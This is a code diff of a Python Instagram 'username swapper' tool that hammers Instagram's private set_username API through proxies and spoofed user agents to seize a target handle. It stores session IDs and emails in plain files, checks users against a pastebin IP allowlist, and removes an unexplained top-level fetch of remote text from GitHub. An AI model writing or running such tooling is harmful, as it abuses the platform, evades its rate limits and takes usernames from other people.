@@ -1,5 +1,3 @@
-
-dd = requests.get('https://raw.githubusercontent.com/7zb8/alphaswap/main/swap').text
 c1 = ''
 c2 = ''
 ee = Tk()
@@ -16,7 +14,7 @@ import uuid
 
 os.system('mode con: cols=95 lines=20')
 SettingsO = []
-ctypes.windll.kernel32.SetConsoleTitleW(f'#Alpha Swap - By @7zb8')
+ctypes.windll.kernel32.SetConsoleTitleW(f'Alpha Swapper | v3.1 | @sxne - @7zb8')
 os.system('cls' if os.name == 'nt' else 'clear')
 Token = string.ascii_lowercase + string.ascii_uppercase + string.digits
 TOKEN = (''.join(random.choice(Token) for i in range(30)))
@@ -32,7 +30,7 @@ else:
 GetIP = requests.get('https://api.ipify.org?format=json').text
 GETIP = re.findall('{"ip":"(.*?)"}', GetIP)
 IP = " ".join(GETIP)
-if IP in TEXT :
+if IP in TEXT:
     pass
 else:
     PASTEBIN2 = 'https://pastebin.com/raw/nc3eE3zS'
@@ -130,7 +128,7 @@ def generateUSER_AGENT():
 
 
 d, p = 0, 0
-banner  = """
+banner = """
 
 
      ▄▄▄       ██▓     ██▓███   ██░ ██  ▄▄▄           ██████  █     █░ ▄▄▄       ██▓███  
@@ -161,6 +159,15 @@ print(f"""
 
                          Alpha Swapper V3.1 | By @7zb8 - @sxne
 """)
+try :
+    name = open('name.txt','r').read().splitlines()[0]
+except:
+    name_ = input('  [ + ] Enter Your Instagram Username : ')
+    with open('name.txt','a') as WQ:
+        WQ.write(f'{name_}')
+        WQ.close()
+os.system('cls' if os.name == 'nt' else 'clear')
+print(banner)
 proxy_mode = input(f'  [ Y ] Swap With Proxies | [ N ] Swap Without Proxies\n  [ + ] Enter Mode : ')
 if proxy_mode == 'y':
     os.system('cls' if os.name == 'nt' else 'clear')
@@ -250,7 +257,7 @@ else:
       ▒   ▒▒ ░░ ░ ▒  ░░▒ ░      ▒ ░▒░ ░  ▒   ▒▒ ░   ░ ░▒  ░ ░  ▒ ░ ░    ▒   ▒▒ ░░▒ ░     
       ░   ▒     ░ ░   ░░        ░  ░░ ░  ░   ▒      ░  ░  ░    ░   ░    ░   ▒   ░░       
           ░  ░    ░  ░          ░  ░  ░      ░  ░         ░      ░          ░  ░         
-    
+
                          Alpha Swapper V3.1 | By @7zb8 - @sxne
     """)
     Login_Mode = input(f'  [ Y ] Login With Sessionid | [ N ] Login With username,password\n  [ + ] Enter Mode : ')
@@ -268,7 +275,7 @@ else:
       ▒   ▒▒ ░░ ░ ▒  ░░▒ ░      ▒ ░▒░ ░  ▒   ▒▒ ░   ░ ░▒  ░ ░  ▒ ░ ░    ▒   ▒▒ ░░▒ ░     
       ░   ▒     ░ ░   ░░        ░  ░░ ░  ░   ▒      ░  ░  ░    ░   ░    ░   ▒   ░░       
           ░  ░    ░  ░          ░  ░  ░      ░  ░         ░      ░          ░  ░         
-    
+
                          Alpha Swapper V3.1 | By @7zb8 - @sxne
         """)
         SIS = input(f'  [ + ] Enter Sessionid : {c1}')
@@ -287,7 +294,7 @@ else:
       ▒   ▒▒ ░░ ░ ▒  ░░▒ ░      ▒ ░▒░ ░  ▒   ▒▒ ░   ░ ░▒  ░ ░  ▒ ░ ░    ▒   ▒▒ ░░▒ ░     
       ░   ▒     ░ ░   ░░        ░  ░░ ░  ░   ▒      ░  ░  ░    ░   ░    ░   ▒   ░░       
           ░  ░    ░  ░          ░  ░  ░      ░  ░         ░      ░          ░  ░         
-    
+
                          Alpha Swapper V3.1 | By @7zb8 - @sxne
         """)
         username = input(f'  [ + ] Enter Username : ')
@@ -480,7 +487,7 @@ else:
             data["external_url"] = ""
             data['_csrftoken'] = 'massing'
             data["phone_number"] = ""
-            data["username"] = 'raven'+(''.join(random.choice(Token) for i in range(10)))
+            data["username"] = 'raven' + (''.join(random.choice(Token) for i in range(10)))
             data["first_name"] = ""
             data["biograph"] = ""
             data["email"] = email
@@ -494,13 +501,17 @@ else:
             elif ('"Try Again Later"') in Swap:
                 input(f'  [ - ] Account Is Not Working !')
                 __ = input(f'  [ Y ] Pass | [ N ] Exit\n  [ + ] Enter Mode : ')
-                if __ == 'y':pass
-                else:os._exit(1)
+                if __ == 'y':
+                    pass
+                else:
+                    os._exit(1)
             else:
                 input(f'  [ - ] Account Is Not Working !')
                 __ = input(f'  [ Y ] Pass | [ N ] Exit\n  [ + ] Enter Mode : ')
-                if __ == 'y':pass
-                else:os._exit(1)
+                if __ == 'y':
+                    pass
+                else:
+                    os._exit(1)
 
         except:
             input(f'  [ - ] Error While Checking Block !')
@@ -560,6 +571,8 @@ class main:
 
     def __init__(self):
         self.run = True
+        os.system('cls' if os.name == 'nt' else 'clear')
+        print(banner)
         if proxy_mode == 'y':
             ctypes.windll.user32.MessageBoxW(0, f'Ready ? \nTarget : {Target}\n Thread : {THE}', '#ALPHA SWAP')
             threading.Thread(target=self.r_S).start()
@@ -603,12 +616,14 @@ class main:
                                     proxy = {'http': f"socks4://{proxq}", 'https': f"socks4://{proxq}"}
                                 url2 = 'https://i.instagram.com/api/v1/accounts/set_username/'
                                 data2 = {'username': Target}
-                                SwapS = requests.post(url2, headers={'User-Agent': generateUSER_AGENT(), "Accept": "*/*",
-                                                                     "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US",
-                                                                     "X-IG-Capabilities": "3brTvw==",
-                                                                     "X-IG-Connection-Type": "WIFI",
-                                                                     "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
-                                                                     'Host': 'i.instagram.com', 'Connection': 'keep-alive'},
+                                SwapS = requests.post(url2,
+                                                      headers={'User-Agent': generateUSER_AGENT(), "Accept": "*/*",
+                                                               "Accept-Encoding": "gzip, deflate",
+                                                               "Accept-Language": "en-US",
+                                                               "X-IG-Capabilities": "3brTvw==",
+                                                               "X-IG-Connection-Type": "WIFI",
+                                                               "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+                                                               'Host': 'i.instagram.com', 'Connection': 'keep-alive'},
                                                       data=data2, cookies={'sessionid': f'{SWES}'}, proxies=proxy)
                                 if ('"status":"ok"') in SwapS.text:
                                     if self.run:
@@ -624,7 +639,7 @@ class main:
                                             data["embeds"] = [
                                                 {
                                                     "color": 3535345, "thumbnail": {"url": ""},
-                                                    "footer": {"text": f'Attempts : {d} | R/s : {self.rs}',
+                                                    "footer": {"text": f'Attempts : {d} | R/s : {self.rs} | @{open("name.txt","r").read().splitlines()[0]}',
                                                                "icon_url": f"https://media4.giphy.com/media/4ilFRqgbzbx4c/200.gif"},
                                                     "author": {"name": "#Alpha v3.1"},
                                                     "title": f"💀, alpha catch it @{Target}"}
@@ -637,20 +652,27 @@ class main:
                                             try:
                                                 requests.post('https://i.instagram.com/api/v1/accounts/set_biography/',
                                                               data={"raw_text": BIO},
-                                                              headers={'User-Agent': generateUSER_AGENT(), "Accept": "*/*",
-                                                                       "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US",
-                                                                       "X-IG-Capabilities": "3brTvw==", "X-IG-Connection-Type": "WIFI",
+                                                              headers={'User-Agent': generateUSER_AGENT(),
+                                                                       "Accept": "*/*",
+                                                                       "Accept-Encoding": "gzip, deflate",
+                                                                       "Accept-Language": "en-US",
+                                                                       "X-IG-Capabilities": "3brTvw==",
+                                                                       "X-IG-Connection-Type": "WIFI",
                                                                        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
-                                                                       'Host': 'i.instagram.com', 'Connection': 'keep-alive'},
+                                                                       'Host': 'i.instagram.com',
+                                                                       'Connection': 'keep-alive'},
                                                               cookies={'sessionid': f'{SWES}'})
-                                                requests.post('https://i.instagram.com/api/v1/accounts/set_phone_and_name/',
-                                                              data={"first_name": NAME},
-                                                              headers={'User-Agent': generateUSER_AGENT(), "Accept": "*/*",
-                                                                       "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US",
-                                                                       "X-IG-Capabilities": "3brTvw==", "X-IG-Connection-Type": "WIFI",
-                                                                       "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
-                                                                       'Host': 'i.instagram.com', 'Connection': 'keep-alive'},
-                                                              cookies={'sessionid': f'{SWES}'})
+                                                requests.post(
+                                                    'https://i.instagram.com/api/v1/accounts/set_phone_and_name/',
+                                                    data={"first_name": NAME},
+                                                    headers={'User-Agent': generateUSER_AGENT(), "Accept": "*/*",
+                                                             "Accept-Encoding": "gzip, deflate",
+                                                             "Accept-Language": "en-US",
+                                                             "X-IG-Capabilities": "3brTvw==",
+                                                             "X-IG-Connection-Type": "WIFI",
+                                                             "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+                                                             'Host': 'i.instagram.com', 'Connection': 'keep-alive'},
+                                                    cookies={'sessionid': f'{SWES}'})
                                             except:
                                                 pass
                                             try:
@@ -669,22 +691,24 @@ class main:
                                                                     cookies={'sessionid': f'{SWES}'}).json()
                                                 email = gett['user']['email']
                                                 with open(f'@{Target}.txt', 'a') as dee:
-                                                    dee.write(f'username : {Target}\nsessionid : {SWES}\ne-mail : {email}')
+                                                    dee.write(
+                                                        f'username : {Target}\nsessionid : {SWES}\ne-mail : {email}')
 
                                             except:
                                                 pass
-                                            ctypes.windll.user32.MessageBoxW(0, f'{MSGAX} @{Target}\nattempt : {d}', '#ALPHA SWAP')
+                                            ctypes.windll.user32.MessageBoxW(0, f'{MSGAX} @{Target}\nattempt : {d}',
+                                                                             '#ALPHA SWAP')
                                             try:
                                                 os._exit(1)
                                             except:
                                                 exit(1)
                                 elif SwapS.status_code == 400:
-                                        d += 1
+                                    d += 1
                                 else:
                                     error += 1
                         remover.clear()
             except:
-                    error += 1
+                error += 1
 
 
     else:
@@ -706,7 +730,8 @@ class main:
                 if self.run:
                     while self.run:
                         SwapA = requests.post(url1, headers={'User-Agent': generateUSER_AGENT(), "Accept": "*/*",
-                                                             "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US",
+                                                             "Accept-Encoding": "gzip, deflate",
+                                                             "Accept-Language": "en-US",
                                                              "X-IG-Capabilities": "3brTvw==",
                                                              "X-IG-Connection-Type": "WIFI",
                                                              "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
@@ -725,7 +750,7 @@ class main:
                                     data["embeds"] = [
                                         {
                                             "color": 3535345, "thumbnail": {"url": ""},
-                                            "footer": {"text": f'Attempts : {d} | R/s : {self.rs}',
+                                            "footer": {"text": f'Attempts : {d} | R/s : known | @{open("name.txt","r").read().splitlines()[0]}',
                                                        "icon_url": f"https://media4.giphy.com/media/4ilFRqgbzbx4c/200.gif"},
                                             "author": {"name": "#Alpha v3.1"},
                                             "title": f"💀, alpha catch it @{Target}"}
@@ -739,16 +764,20 @@ class main:
                                         requests.post('https://i.instagram.com/api/v1/accounts/set_biography/',
                                                       data={"raw_text": BIO},
                                                       headers={'User-Agent': generateUSER_AGENT(), "Accept": "*/*",
-                                                               "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US",
-                                                               "X-IG-Capabilities": "3brTvw==", "X-IG-Connection-Type": "WIFI",
+                                                               "Accept-Encoding": "gzip, deflate",
+                                                               "Accept-Language": "en-US",
+                                                               "X-IG-Capabilities": "3brTvw==",
+                                                               "X-IG-Connection-Type": "WIFI",
                                                                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                                                                'Host': 'i.instagram.com', 'Connection': 'keep-alive'},
                                                       cookies=SES)
                                         requests.post('https://i.instagram.com/api/v1/accounts/set_phone_and_name/',
                                                       data={"first_name": NAME},
                                                       headers={'User-Agent': generateUSER_AGENT(), "Accept": "*/*",
-                                                               "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US",
-                                                               "X-IG-Capabilities": "3brTvw==", "X-IG-Connection-Type": "WIFI",
+                                                               "Accept-Encoding": "gzip, deflate",
+                                                               "Accept-Language": "en-US",
+                                                               "X-IG-Capabilities": "3brTvw==",
+                                                               "X-IG-Connection-Type": "WIFI",
                                                                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                                                                'Host': 'i.instagram.com', 'Connection': 'keep-alive'},
                                                       cookies=SES)
@@ -756,13 +785,14 @@ class main:
                                         pass
                                     with open(f'@{Target}.txt', 'a') as dee:
                                         dee.write(f'username : {Target}\nsessionid : {SIS}\ne-mail : {email}')
-                                    ctypes.windll.user32.MessageBoxW(0, f'{MSGAX} @{Target}\nattempt : {d}', '#ALPHA SWAP')
+                                    ctypes.windll.user32.MessageBoxW(0, f'{MSGAX} @{Target}\nattempt : {d}',
+                                                                     '#ALPHA SWAP')
                                     try:
                                         os._exit(1)
                                     except:
                                         exit(1)
                         elif SwapA.status_code == 400:
-                                d += 1
+                            d += 1
                         else:
                             error += 1
             except:
@@ -776,7 +806,8 @@ class main:
                 if self.run:
                     while self.run:
                         SwapS = requests.post(url2, headers={'User-Agent': generateUSER_AGENT(), "Accept": "*/*",
-                                                             "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US",
+                                                             "Accept-Encoding": "gzip, deflate",
+                                                             "Accept-Language": "en-US",
                                                              "X-IG-Capabilities": "3brTvw==",
                                                              "X-IG-Connection-Type": "WIFI",
                                                              "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
@@ -795,7 +826,7 @@ class main:
                                     data["embeds"] = [
                                         {
                                             "color": 3535345, "thumbnail": {"url": ""},
-                                            "footer": {"text": f'Attempts : {d} | R/s : {self.rs}',
+                                            "footer": {"text": f'Attempts : {d} | R/s : known | @{open("name.txt","r").read().splitlines()[0]}',
                                                        "icon_url": f"https://media4.giphy.com/media/4ilFRqgbzbx4c/200.gif"},
                                             "author": {"name": "#Alpha v3.1"},
                                             "title": f"💀, alpha catch it @{Target}"}
@@ -809,16 +840,20 @@ class main:
                                         requests.post('https://i.instagram.com/api/v1/accounts/set_biography/',
                                                       data={"raw_text": BIO},
                                                       headers={'User-Agent': generateUSER_AGENT(), "Accept": "*/*",
-                                                               "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US",
-                                                               "X-IG-Capabilities": "3brTvw==", "X-IG-Connection-Type": "WIFI",
+                                                               "Accept-Encoding": "gzip, deflate",
+                                                               "Accept-Language": "en-US",
+                                                               "X-IG-Capabilities": "3brTvw==",
+                                                               "X-IG-Connection-Type": "WIFI",
                                                                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                                                                'Host': 'i.instagram.com', 'Connection': 'keep-alive'},
                                                       cookies=SES)
                                         requests.post('https://i.instagram.com/api/v1/accounts/set_phone_and_name/',
                                                       data={"first_name": NAME},
                                                       headers={'User-Agent': generateUSER_AGENT(), "Accept": "*/*",
-                                                               "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US",
-                                                               "X-IG-Capabilities": "3brTvw==", "X-IG-Connection-Type": "WIFI",
+                                                               "Accept-Encoding": "gzip, deflate",
+                                                               "Accept-Language": "en-US",
+                                                               "X-IG-Capabilities": "3brTvw==",
+                                                               "X-IG-Connection-Type": "WIFI",
                                                                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                                                                'Host': 'i.instagram.com', 'Connection': 'keep-alive'},
                                                       cookies=SES)
@@ -826,13 +861,14 @@ class main:
                                         pass
                                     with open(f'@{Target}.txt', 'a') as dee:
                                         dee.write(f'username : {Target}\nsessionid : {SIS}\ne-mail : {email}')
-                                    ctypes.windll.user32.MessageBoxW(0, f'{MSGAX} @{Target}\nattempt : {d}', '#ALPHA SWAP')
+                                    ctypes.windll.user32.MessageBoxW(0, f'{MSGAX} @{Target}\nattempt : {d}',
+                                                                     '#ALPHA SWAP')
                                     try:
                                         os._exit(1)
                                     except:
                                         exit(1)
                             elif SwapS.status_code == 400:
-                                    d += 1
+                                d += 1
                             else:
                                 error += 1
             except:
@@ -844,12 +880,3 @@ class main:
 
 
 main()
-
-
-
-
-
-
-
-
-
